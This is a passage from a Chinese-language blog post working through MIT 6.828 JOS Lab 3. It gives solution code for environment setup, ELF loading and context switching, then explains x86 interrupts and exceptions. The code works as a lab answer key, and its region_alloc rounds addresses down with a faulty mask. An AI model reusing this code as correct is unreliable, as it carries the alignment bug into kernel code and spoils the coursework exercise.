class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Set up envs array</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> i;<br><br>env_free_list = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span> (i = NENV - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>envs[i].env_id = <span class="hljs-number">0</span>;<br>envs[i].env_status = ENV_FREE;<br>envs[i].env_link = env_free_list;<br>env_free_list = &amp;envs[i];<br>&#125;<br><br><span class="hljs-comment">// Per-CPU part of the initialization</span><br>env_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-setup-vm-：分配进程环境资源">env_setup_vm()：分配进程环境资源</h4><p>惯例先看注释，主要是让我们分配用户进程所需资源：就目前而言只是分配一个页目录表，并建立对应的内核入口点的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize the kernel virtual memory layout for environment e.</span><br><span class="hljs-comment">// Allocate a page directory, set e-&gt;env_pgdir accordingly,</span><br><span class="hljs-comment">// and initialize the kernel portion of the new environment&#x27;s address space.</span><br><span class="hljs-comment">// Do NOT (yet) map anything into the user portion</span><br><span class="hljs-comment">// of the environment&#x27;s virtual address space.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors include:</span><br><span class="hljs-comment">//-E_NO_MEM if page directory or table could not be allocated.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>所有的进程共享同一份内核空间（<code>UTOP</code> 往上的虚拟空间），除了<code>UVPT</code>——每个进程各自应当有一份独立的页目录表，因此在该函数中我们需要初始化单个进程的页表对内核空间的映射，参照 <code>inc/memlayout.h</code> 中的布局</p><p>在 JOS 中其实是类似于普通 OS 以前的做法：每个进程共享一份完整的内核地址空间的映射，但笔者认为其实我们只需要映射只读的 pages 数组与 envs 数组即可，<strong>内核的其他区域用户是没有任何访问权限的，那其实没必要建立映射</strong>，笔者认为比较理想的一个状态是类似 KPTI 那样的——用户态与内核态各自有一张页表，其中内核态页表完整映射内核空间，用户态页表仅映射内核入口点，同时两张页表都完整映射用户空间</p><p>这并非不能实现，但是<strong>这或许需要对 JOS 源码进行相当大的改动，且该函数除了创建用户进程以外还承担了创建内核进程的任务，而后者是需要对内核空间有访问权限的</strong>，且 KPTI 确乎会带来一定的开销（但是可以防止熔断与幽灵漏洞的攻击，可能作为一个安全研究员第一想到的并不是性能而是安全性），因此这里笔者还是选择老老实实地完整拷贝一份内核页表</p><blockquote><p>这里别忘了 page_alloc() 分配的是 page 结构体的地址，我们还需要手动转为虚拟地址</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">env_setup_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">p</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// Allocate a page for the page directory</span><br><span class="hljs-keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    - The VA space of all envs is identical above UTOP</span><br><span class="hljs-comment">//(except at UVPT, which we&#x27;ve set below).</span><br><span class="hljs-comment">//See inc/memlayout.h for permissions and layout.</span><br><span class="hljs-comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span><br><span class="hljs-comment">//(Make sure you got the permissions right in Lab 2.)</span><br><span class="hljs-comment">//    - The initial VA below UTOP is empty.</span><br><span class="hljs-comment">//    - You do not need to make any more calls to page_alloc.</span><br><span class="hljs-comment">//    - Note: In general, pp_ref is not maintained for</span><br><span class="hljs-comment">//physical pages mapped only above UTOP, but env_pgdir</span><br><span class="hljs-comment">//is an exception -- you need to increment env_pgdir&#x27;s</span><br><span class="hljs-comment">//pp_ref for env_free to work correctly.</span><br><span class="hljs-comment">//    - The functions in kern/pmap.h are handy.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>p-&gt;pp_ref++;<br><br><span class="hljs-comment">// copy kernel pgdir</span><br><span class="hljs-built_in">memcpy</span>(page2kva(p), kern_pgdir, PGSIZE);<br><br>e-&gt;env_pgdir = page2kva(p);<br><br><span class="hljs-comment">// UVPT maps the env&#x27;s own page table read-only.</span><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>而且仔细想来，KPTI并非是基于安全性的改进，<strong>而是对漏洞不得不做出的妥协</strong>，况且这也就只是做个实验而已，暂时还是不大张旗鼓地改了</p></blockquote><h4 id="region-alloc-：为进程分配物理页面，建立映射">region_alloc()：为进程分配物理页面，建立映射</h4><p>主要是为用户进程的 va 起始处 len 长度的虚拟地址空间分配物理页面，别忘了大小按页面粒度对齐以及页表项用户可写权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocate len bytes of physical memory for environment env,</span><br><span class="hljs-comment">// and map it at virtual address va in the environment&#x27;s address space.</span><br><span class="hljs-comment">// Does not zero or otherwise initialize the mapped pages in any way.</span><br><span class="hljs-comment">// Pages should be writable by user and kernel.</span><br><span class="hljs-comment">// Panic if any allocation attempt fails.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">region_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-comment">// (But only if you need it for load_icode.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: It is easier to use region_alloc if the caller can pass</span><br><span class="hljs-comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span><br><span class="hljs-comment">//   You should round va down, and round (va + len) up.</span><br><span class="hljs-comment">//   (Watch out for corner-cases!)</span><br><span class="hljs-type">size_t</span> start, end;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_p</span>;</span><br><br>start = ((<span class="hljs-type">size_t</span>)va) &amp; (~PGSIZE);<br>end = ROUNDUP((<span class="hljs-type">size_t</span>)va + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>new_p = page_alloc(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!new_p)<br>panic(<span class="hljs-string">&quot;Out of memory while allocating region for env!&quot;</span>);<br>new_p-&gt;pp_ref++;<br><span class="hljs-keyword">if</span>(page_insert(e-&gt;env_pgdir, new_p, (<span class="hljs-type">void</span>*)start, PTE_U | PTE_W))<br>panic(<span class="hljs-string">&quot;OOM while inserting page into page table!&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="load-icode-：解析-ELF-文件，作为新进程载入">load_icode()：解析 ELF 文件，作为新进程载入</h4><p>先看注释，让我们手写一个 ELF 解析器，为各个存在于 ELF 中的段分配空间（例如 bss 段在 ELF 中就不占空间）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Set up the initial program binary, stack, and processor flags</span><br><span class="hljs-comment">// for a user process.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function loads all loadable segments from the ELF binary image</span><br><span class="hljs-comment">// into the environment&#x27;s user memory, starting at the appropriate</span><br><span class="hljs-comment">// virtual addresses indicated in the ELF program header.</span><br><span class="hljs-comment">// At the same time it clears to zero any portions of these segments</span><br><span class="hljs-comment">// that are marked in the program header as being mapped</span><br><span class="hljs-comment">// but not actually present in the ELF file - i.e., the program&#x27;s bss section.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// All this is very similar to what our boot loader does, except the boot</span><br><span class="hljs-comment">// loader also needs to read the code from disk.  Take a look at</span><br><span class="hljs-comment">// boot/main.c to get ideas.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Finally, this function maps one page for the program&#x27;s initial stack.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// load_icode panics if it encounters problems.</span><br><span class="hljs-comment">//  - How might load_icode fail?  What might be wrong with the given input?</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>主要还是苦力活，解析 ELF header，选出可载入段（<code>ph-&gt;p_type == ELF_PROG_LOAD</code>），分配内存，在页表中建立映射，不过这里提示我们可以抄一抄 <code>boot/main.c</code> 中的解析方法（<s>那👴当然要抄🌶</s>）</p><blockquote><p>关于 ELF 格式网上大把资料，不会的可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90</a></p></blockquote><p>这里我们需要注意的是，由于我们仅需要在用户空间建立映射，而我们在分配完空间之后还需要将数据拷贝上去，考虑到用户空间页表中也映射了内核空间，<strong>我们可以先切换到用户页表处理数据，完成之后再切换回内核页表</strong>，在 JOS 中提供了一个 <code>lcr3()</code> 让我们能直接更改 cr3 寄存器的值（该寄存器中存放着页目录表的地址）</p><p>别忘了将 ELF header 中的 entry （<strong>程序入口点</strong>）给到 Env 结构体中寄存器结构体的 eip</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">uint8_t</span> *binary)</span><br>&#123;<br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//  Load each program segment into virtual memory</span><br><span class="hljs-comment">//  at the address specified in the ELF segment header.</span><br><span class="hljs-comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span><br><span class="hljs-comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span><br><span class="hljs-comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span><br><span class="hljs-comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span><br><span class="hljs-comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span><br><span class="hljs-comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span><br><span class="hljs-comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span><br><span class="hljs-comment">//  Use functions from the previous lab to allocate and map pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  All page protection bits should be user read/write for now.</span><br><span class="hljs-comment">//  ELF segments are not necessarily page-aligned, but you can</span><br><span class="hljs-comment">//  assume for this function that no two segments will touch</span><br><span class="hljs-comment">//  the same virtual page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You may find a function like region_alloc useful.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  Loading the segments is much simpler if you can move data</span><br><span class="hljs-comment">//  directly into the virtual addresses stored in the ELF binary.</span><br><span class="hljs-comment">//  So which page directory should be in force during</span><br><span class="hljs-comment">//  this function?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You must also do something with the program&#x27;s entry point,</span><br><span class="hljs-comment">//  to make sure that the environment starts executing there.</span><br><span class="hljs-comment">//  What?  (See env_run() and env_pop_tf() below.)</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf</span> *<span class="hljs-title">elfhdr</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">ustack</span>;</span><br><br><span class="hljs-comment">// check ELF magic</span><br>elfhdr = (<span class="hljs-keyword">struct</span> Elf*) binary;<br><span class="hljs-keyword">if</span> (elfhdr-&gt;e_magic != ELF_MAGIC)<br>panic(<span class="hljs-string">&quot;Invalid ELF header!&quot;</span>);<br><br><span class="hljs-comment">// switch to user pgdir</span><br>lcr3(PADDR(e-&gt;env_pgdir));<br><br><span class="hljs-comment">// analyze the header table and copy data</span><br>ph = (<span class="hljs-keyword">struct</span> Proghdr *) (binary + elfhdr-&gt;e_phoff);<br>eph = ph + elfhdr-&gt;e_phnum;<br><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>&#123;<br><span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PROG_LOAD)<br><span class="hljs-keyword">continue</span>;<br><br>region_alloc(e, (<span class="hljs-type">void</span>*)ph-&gt;p_va, ph-&gt;p_memsz);<br><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), <span class="hljs-number">0</span>, ph-&gt;p_memsz);<br><span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), (<span class="hljs-type">void</span>*)(binary + ph-&gt;p_offset), ph-&gt;p_filesz);<br>&#125;<br><br><span class="hljs-comment">// set the entry point</span><br>e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;<br><br><span class="hljs-comment">// Now map one page for the program&#x27;s initial stack</span><br><span class="hljs-comment">// at virtual address USTACKTOP - PGSIZE.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>region_alloc(e, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PGSIZE);<br>ustack = page_lookup(e-&gt;env_pgdir, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), <span class="hljs-literal">NULL</span>);<br>page_insert(kern_pgdir, ustack, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PTE_U | PTE_W);<br><br><span class="hljs-comment">// recover kernel pgdir</span><br>lcr3(PADDR(kern_pgdir));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-create-：创建进程环境">env_create()：创建进程环境</h4><p>调用 <code>env_alloc()</code> 分配 PCB、调用 <code>load_icode()</code> 解析载入 ELF 即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a new env with env_alloc, loads the named elf</span><br><span class="hljs-comment">// binary into it with load_icode, and sets its env_type.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">// The new env&#x27;s parent ID is set to 0.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_create</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">new_env</span>;</span><br><span class="hljs-keyword">switch</span>(env_alloc(&amp;new_env, <span class="hljs-number">0</span>))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<span class="hljs-comment">// success</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> -E_NO_FREE_ENV:<br>panic(<span class="hljs-string">&quot;No free Env now!&quot;</span>);<br><span class="hljs-keyword">case</span> -E_NO_MEM:<br>panic(<span class="hljs-string">&quot;OOM while alloc the Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;unknown fault from env_alloc!&quot;</span>);<br>&#125;<br><br>new_env-&gt;env_type = type;<br>load_icode(new_env, binary);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-run-：将进程加入运行队列">env_run()：将进程加入运行队列</h4><p>分为三步走：</p><ul><li>若当前有进程在运行（curenv != NULL)，将其状态设为 <code>ENV_RUNNABLE</code></li><li>将 curenv 设为待运行进程的 Env并改变其状态、增加运行次数计数，切换到用户页表</li><li>恢复用户进程运行上下文，从内核态切换到用户态</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Context switch from curenv to env e.</span><br><span class="hljs-comment">// Note: if this is the first call to env_run, curenv is NULL.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function does not return.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// Step 1: If this is a context switch (a new environment is running):</span><br><span class="hljs-comment">//   1. Set the current environment (if any) back to</span><br><span class="hljs-comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span><br><span class="hljs-comment">//      what other states it can be in),</span><br><span class="hljs-comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span><br><span class="hljs-comment">//   3. Set its status to ENV_RUNNING,</span><br><span class="hljs-comment">//   4. Update its &#x27;env_runs&#x27; counter,</span><br><span class="hljs-comment">//   5. Use lcr3() to switch to its address space.</span><br><span class="hljs-comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span><br><span class="hljs-comment">//   registers and drop into user mode in the</span><br><span class="hljs-comment">//   environment.</span><br><br><span class="hljs-comment">// Hint: This function loads the new environment&#x27;s state from</span><br><span class="hljs-comment">//e-&gt;env_tf.  Go back through the code you wrote above</span><br><span class="hljs-comment">//and make sure you have set the relevant parts of</span><br><span class="hljs-comment">//e-&gt;env_tf to sensible values.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (curenv)<br>&#123;<br><span class="hljs-keyword">switch</span> (curenv-&gt;env_status)<br>&#123;<br><span class="hljs-keyword">case</span> ENV_RUNNING:<br><span class="hljs-keyword">case</span> ENV_RUNNABLE:<br><span class="hljs-keyword">case</span> ENV_NOT_RUNNABLE:<br>curenv-&gt;env_status = ENV_RUNNABLE;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> ENV_FREE:<br>panic(<span class="hljs-string">&quot;running a free Env!&quot;</span>);<br><span class="hljs-keyword">case</span> ENV_DYING:<br>panic(<span class="hljs-string">&quot;running a dying Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;The env is crashed!&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// set the curenv</span><br>curenv = e;<br>curenv-&gt;env_status = ENV_RUNNING;<br>curenv-&gt;env_runs++;<br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>完成这一切后，我们来跑一下这份代码，<strong>你会发现内核成功地运行了程序 hello，并在其尝试调用 0x30号中断时 触发了 triple fault 导致运行暂停</strong></p><p><img src="https://s2.loli.net/2022/03/17/5E9QxkMsrFnKoOq.png" alt="image.png"></p><p>那为什么会触发 triple fault 呢？如同 32位 Linux kernel 所做的一般，JOS 也将系统调用实现为一个中断，这便是第一个 fault（需要注意 fault 并非都代表错误，很多机制其实是通过这种“fault”的触发而实现的）；而由于 JOS 尚未设置中断处理程序，因此 CPU 会生成一个 general protection exception，这便是 double fault；然后 CPU 又要处理生成的这个 exception，但是没有对应的处理程序（套娃了），于是就 triple fault 了，但是这并不会无限嵌套下去，在 triple fault 的时候系统就完全无法运行了，通常情况下就重启了，因为我们是 patched qemu 所以会被 qemu 挂起</p><h3 id="Handling-Interrupts-and-Exceptions">Handling Interrupts and Exceptions</h3><p>因此接下来我们来实现中断处理与异常处理，首先是 Exercise 3，阅读了解中断与异常相关基础知识</p><blockquote><p><strong>Exercise 3.</strong> Read <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c09.htm">Chapter 9, Exceptions and Interrupts</a> in the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">80386 Programmer’s Manual</a> (or Chapter 5 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">IA-32 Developer’s Manual</a>), if you haven’t already.</p></blockquote><p><strong>中断</strong>（interrupt）与<strong>异常</strong>（exception）是两种特别的改变控制流的方式，其工作原理类似于非编程式的 <code>call</code> 指令——改变正常的程序流程以处理外部事件或报告错误与异常情况</p><p>中断与异常的区别在于中断用以处理处理器外的异步事件，而异常则是处理器在运行时检测到异常事件后的处理</p><p>中断与异常通常有如下来源：</p><ul><li>中断：<ul><li>可屏蔽中断，通过 INTR 引脚发出</li><li>不可屏蔽中断，通过 NMI 引脚发出</li></ul></li><li>异常：<ul><li>由处理器检测到的，具体可分为 faults、traps 与 aborts</li><li>编程式的，通过指令 into、int 3、int n、bound 可触发异常，通常称之为“软中断”，但处理器将其作为异常来处理</li></ul></li></ul><h4 id="Identify-Interrupts">Identify Interrupts</h4><p>处理器将不同的中断与异常进行独立标号，其中 NMI 与异常对应标号 0 ~ 31（并非所有标号都有对应用途，部分标号为未来保留）；可屏蔽中断的标识符由外部中断控制器（例如 Intel 8259A 的可编程中断控制器（Programmable Interrupt Controller））确定，并在处理器的中断确认序列中与处理器通信，8259A 的 PIC 分配的标号可以由软件指定，范围为 32 ~ 255</p><p>根据异常报告的方式与是否支持重启指令将其分为三类：</p><ul><li><p>Faults：在“指令造成异常前”被报告的异常，可以是在指令开始执行时或是执行过程中被检测到，若在执行指令时检测到异常，则会保存当前上下文，完成异常处理后再恢复上下文，<strong>重新从造成异常的指令开始执行</strong></p><blockquote><p>举个🌰：Linux 中的 page fault 就是这样的一种异常，当读写尚未分配内存页的地址时（比如说 mmap 分配了一个 vma 但是还没分配物理页框）便会触发缺页异常处理程序，分配内存页后再重新从读写的指令开始运行</p></blockquote></li><li><p>Traps：在检测到异常的指令后立即在指令边界报告的异常（<s>别问，👴也没看懂英文原文啥意思</s>）</p><blockquote><p>举个🌰：系统调用的流程简化后类似于一个陷阱，用户态进程布置好数据后通过指令陷入到内核态，内核完成处理后再返回用户态，执行下一条指令</p></blockquote></li><li><p>Aborts：是一种既不精确定位指令也不重启程序的异常，通常用来报告<strong>严重的错误</strong>（例如硬件错误或非法值）</p><blockquote><p>例如除以 0 可能就是一种 Abort？</p></blockquote></li></ul><p>下表显示了中断与异常对应类型的标识符</p><figure class="highlight smali"><table><tr><td 